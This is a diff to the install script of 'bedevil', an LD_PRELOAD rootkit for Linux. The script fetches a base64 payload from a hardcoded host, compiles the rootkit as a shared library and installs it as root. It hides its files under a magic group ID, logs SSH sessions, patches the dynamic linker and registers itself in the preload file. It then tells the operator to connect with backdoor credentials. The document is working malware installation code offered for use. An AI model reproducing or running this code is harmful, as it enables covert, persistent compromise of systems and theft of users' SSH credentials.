@@ -1,6 +1,6 @@
 #!/bin/sh
 
-[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.48:9001/changeme.b64" # changeme
+[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.33:9001/super.b64" # changeme
 WORKDIR="/tmp" # & mayb this.
 
 [ `id -u` != 0 ] && { echo "not root..."; exit; }
@@ -86,18 +86,21 @@ tar xpfz $TARGZ_NAME >/dev/null && echo "done. removing it." && rm $TARGZ_NAME $
 printf "\ngetting settings\n"
 MAGIC_GID="`sed '1q;d' $INCLUDE_DIR/settings.cfg`"
 INSTALL_DIR="`sed '2q;d' $INCLUDE_DIR/settings.cfg`"
-PRELOAD_FILE="`sed '3q;d' $INCLUDE_DIR/settings.cfg`"
-BDVLSO="`sed '4q;d' $INCLUDE_DIR/settings.cfg`"
-SOPATH="`sed '5q;d' $INCLUDE_DIR/settings.cfg`"
-HIDEPORTS="`sed '6q;d' $INCLUDE_DIR/settings.cfg`"
-SSH_LOGS="`sed '7q;d' $INCLUDE_DIR/settings.cfg`"
-INTEREST_DIR="`sed '8q;d' $INCLUDE_DIR/settings.cfg`"
-BD_VAR="`sed '9q;d' $INCLUDE_DIR/settings.cfg`"
-GID_PATH="`sed '10q;d' $INCLUDE_DIR/settings.cfg`"
-GIDTIME_PATH="`sed '11q;d' $INCLUDE_DIR/settings.cfg`"
+HOMEDIR="`sed '3q;d' $INCLUDE_DIR/settings.cfg`"
+PRELOAD_FILE="`sed '4q;d' $INCLUDE_DIR/settings.cfg`"
+BDVLSO="`sed '5q;d' $INCLUDE_DIR/settings.cfg`"
+SOPATH="`sed '6q;d' $INCLUDE_DIR/settings.cfg`"
+HIDEPORTS="`sed '7q;d' $INCLUDE_DIR/settings.cfg`"
+SSH_LOGS="`sed '8q;d' $INCLUDE_DIR/settings.cfg`"
+INTEREST_DIR="`sed '9q;d' $INCLUDE_DIR/settings.cfg`"
+BD_VAR="`sed '10q;d' $INCLUDE_DIR/settings.cfg`"
+GID_PATH="`sed '11q;d' $INCLUDE_DIR/settings.cfg`"
+GIDTIME_PATH="`sed '12q;d' $INCLUDE_DIR/settings.cfg`"
+LOG_PATH="`sed '13q;d' $INCLUDE_DIR/settings.cfg`"
+ASS_PATH="`sed '14q;d' $INCLUDE_DIR/settings.cfg`"
 printf "done getting config values\n"
 
-install_deps
+#install_deps
 
 echo "compiling rootkit"
 LINKER_FLAGS="-ldl -lcrypt"
@@ -112,40 +115,33 @@ gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTION
 gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.i686 2>/dev/null
 strip $INCLUDE_DIR/$BDVLSO.$PLATFORM 2>/dev/null || { echo "couldn't strip rootkit, exiting"; rm -rf $INCLUDE_DIR; exit; }
 [ -f $INCLUDE_DIR/$BDVLSO.i686 ] && strip $INCLUDE_DIR/$BDVLSO.i686
-echo "rootkit compiled"
-echo "installing"
-[ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR
+echo "rootkit compiled" && echo "installing"
+mkdir -p $INSTALL_DIR && mkdir -p $HOMEDIR
 mv $INCLUDE_DIR/$BDVLSO.$PLATFORM $INSTALL_DIR/
 [ -f $INCLUDE_DIR/$BDVLSO.i686 ] && mv $INCLUDE_DIR/$BDVLSO.i686 $INSTALL_DIR/
 
-printf "\nrootkit installed\n"
-echo "preparing stuff"
+printf "\nrootkit installed\n" && echo "preparing stuff"
 
-mv $INCLUDE_DIR/.bashrc $INSTALL_DIR/ 2>/dev/null
-echo ". .bashrc" > $INSTALL_DIR/.profile
-touch $HIDEPORTS && chmod 644 $HIDEPORTS && cat $INCLUDE_DIR/hideports > $HIDEPORTS
-mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR
-touch $SSH_LOGS && chmod 666 $SSH_LOGS
-touch $GID_PATH && chmod 644 $GID_PATH && printf $MAGIC_GID > $GID_PATH
-touch $GIDTIME_PATH && chmod 640 $GIDTIME_PATH
-touch $INSTALL_DIR/my_ass
-touch $PRELOAD_FILE
-
+mkdir -p $INTEREST_DIR
+for file in $SSH_LOGS $GID_PATH $GIDTIME_PATH $LOG_PATH $ASS_PATH $PRELOAD_FILE; do touch $file; done
+cat $INCLUDE_DIR/hideports > $HIDEPORTS
+printf $MAGIC_GID > $GID_PATH
 rm -r $INCLUDE_DIR
 
 echo "hiding everything"
-chown -h 0:$MAGIC_GID $PRELOAD_FILE $INSTALL_DIR $INSTALL_DIR/* $INSTALL_DIR/.profile
-chown 0:$MAGIC_GID $INSTALL_DIR/.bashrc 2>/dev/null
-chown 0:$MAGIC_GID $SSH_LOGS
-chown 0:$MAGIC_GID $INTEREST_DIR
-chown 0:$MAGIC_GID $HIDEPORTS
-chown 0:$MAGIC_GID $GID_PATH
-chown 0:$MAGIC_GID $GIDTIME_PATH
+chown -h 0:$MAGIC_GID $PRELOAD_FILE $INSTALL_DIR $HOMEDIR $INSTALL_DIR/*
+chown 0:$MAGIC_GID $SSH_LOGS && chmod 666 $SSH_LOGS
+chown 0:$MAGIC_GID $INTEREST_DIR && chmod 777 $INTEREST_DIR
+chown 0:$MAGIC_GID $HIDEPORTS && chmod 644 $HIDEPORTS
+chown 0:$MAGIC_GID $GID_PATH && chmod 644 $GID_PATH
+chown 0:$MAGIC_GID $GIDTIME_PATH && chmod 640 $GIDTIME_PATH
+chown 0:$MAGIC_GID $ASS_PATH && chmod 600 $ASS_PATH
+chown 0:$MAGIC_GID $LOG_PATH && chmod 666 $LOG_PATH
 
 patch_dynamic_linker
 
 echo 'writing $SOPATH to $PRELOAD_FILE'
-printf "$SOPATH" > $PRELOAD_FILE || { printf '\nfailed writing to $PRELOAD_FILE. exiting\n'; rm -rf $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR $GID_PATH; exit; }
+printf "$SOPATH" > $PRELOAD_FILE || { printf '\nfailed writing to $PRELOAD_FILE. exiting\n'; rm -rf $HOMEDIR $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR $GID_PATH $GIDTIME_PATH; exit; }
 printf "\ninstallation finished\nconnect using your backdoor credentials\n"
 
 SCRIPT_PATH="`pwd`/$0"
